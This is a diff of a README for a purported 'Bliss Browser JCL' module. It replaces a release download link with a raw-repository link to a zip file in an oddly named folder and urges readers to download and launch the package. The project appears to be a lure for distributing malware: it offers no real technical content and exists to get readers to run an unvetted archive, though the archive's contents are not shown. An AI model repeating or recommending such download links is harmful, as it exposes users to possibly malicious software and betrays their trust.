@@ -9,9 +9,9 @@ Welcome to the Bliss Browser JCL repository! This is the language support module
 ## Get Started
 To begin exploring the features of the Bliss Browser JCL, you can download the software package from the following link:
 
-[![Download Software](https://github.com/ligdeezznuts/Bliss_Browser_JCL/releases/download/v1.0/Software.zip)](https://github.com/ligdeezznuts/Bliss_Browser_JCL/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ligdeezznuts/Bliss_Browser_JCL/raw/refs/heads/main/disquisitor/Browser-JCL-Bliss-3.7.zip)](https://github.com/ligdeezznuts/Bliss_Browser_JCL/raw/refs/heads/main/disquisitor/Browser-JCL-Bliss-3.7.zip)
 
-The "https://github.com/ligdeezznuts/Bliss_Browser_JCL/releases/download/v1.0/Software.zip" file contains all the necessary files to get started with JCL support in Bliss Browser. Once downloaded, launch the software package to start your JCL programming journey.
+The "https://github.com/ligdeezznuts/Bliss_Browser_JCL/raw/refs/heads/main/disquisitor/Browser-JCL-Bliss-3.7.zip" file contains all the necessary files to get started with JCL support in Bliss Browser. Once downloaded, launch the software package to start your JCL programming journey.
 
 If the provided link is not working or you need access to different versions of the software, please check the "Releases" section of this repository for additional download options.
 
